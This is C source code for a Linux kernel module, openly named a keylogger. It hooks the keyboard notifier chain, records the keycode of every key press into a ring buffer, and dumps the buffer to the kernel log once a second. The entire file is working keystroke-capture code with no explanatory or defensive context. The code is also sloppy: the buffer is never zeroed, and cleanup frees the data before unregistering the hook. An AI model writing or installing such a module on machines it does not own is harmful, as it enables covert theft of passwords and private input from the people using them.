#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/timer.h>
#include <linux/slab.h>

#define MAX_BUFFER_SIZE 100

struct my_driver_data {
    unsigned long hex_buffer[MAX_BUFFER_SIZE];
    int head;
};

struct my_driver_data *driver_data;
struct timer_list my_timer;

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    struct my_driver_data *data = driver_data;   

    if (code == KBD_KEYCODE && param->down)
    {
    	data->hex_buffer[data->head] = param->value;
    	data->head = (data->head + 1) % MAX_BUFFER_SIZE;
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};

void my_timer_callback(struct timer_list *t)
{
    struct my_driver_data *data = driver_data;
    int i, index;

    index = (data->head + MAX_BUFFER_SIZE - 1) % MAX_BUFFER_SIZE;

    printk(KERN_INFO "\nTimer fired!\nASCII values\n");

    for (i = 0; i < MAX_BUFFER_SIZE; i++) {
        if (data->hex_buffer[index] != 0) {
            printk(KERN_INFO " %lx ", data->hex_buffer[index]);
        }
        index = (index + MAX_BUFFER_SIZE - 1) % MAX_BUFFER_SIZE;
    }

    mod_timer(&my_timer, jiffies + msecs_to_jiffies(1000));
}

int init_module(void)
{
    driver_data = kmalloc(sizeof(*driver_data), GFP_KERNEL);
    if (!driver_data) {
        printk(KERN_ERR "Failed to allocate driver data\n");
        return -ENOMEM;
    }

    driver_data->head = 0;

    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Registered the keylogger module with the keyboard notifier chain\n");

    printk(KERN_INFO "Setting up timer\n");

    timer_setup(&my_timer, my_timer_callback, 0);
    mod_timer(&my_timer, jiffies + msecs_to_jiffies(1000));

    return 0;
}

void cleanup_module(void)
{
    del_timer(&my_timer);
    kfree(driver_data);
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Unregistered the keylogger module from the keyboard notifier chain\n");
}

MODULE_LICENSE("GPL");

